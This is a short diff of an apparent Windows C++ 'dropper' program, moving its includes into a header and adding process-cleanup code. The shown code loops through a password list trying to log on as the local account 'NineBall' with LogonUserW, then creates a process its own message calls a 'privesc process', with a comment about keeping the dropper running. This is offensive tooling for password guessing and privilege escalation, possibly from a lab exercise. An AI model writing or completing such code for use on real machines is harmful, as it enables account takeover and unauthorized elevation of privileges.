@@ -1,12 +1,4 @@
-#ifndef UNICODE
-#define UNICODE
-#endif 
-
-#include <Windows.h>
-#include <fstream>
-#include <iostream>
-#include <vector>
-#include <string>
+#include "dropper.hpp"
 
 int wmain() {
 
@@ -26,7 +18,7 @@ int wmain() {
 
 	// attempt to authenticate as NineBall with passwords
 	HANDLE hToken = NULL;
-	for(std::wstring s : passList) {
+	for (std::wstring s : passList) {
 		std::wcout << L"\"" << s << L"\"" << std::endl;
 		if (LogonUserW(
 			L"NineBall",
@@ -69,4 +61,15 @@ int wmain() {
 	)) {
 		std::wcout << L"couldn't create privesc process" << std::endl;
 	}
+
+	// unsure if these will cause dropper to stay up
+	WaitForSingleObject(pi.hProcess, INFINITE);
+	CloseHandle(pi.hProcess);
+	CloseHandle(pi.hThread);
+
+	return 0;
+}
+
+namespace dropper {
+
 }
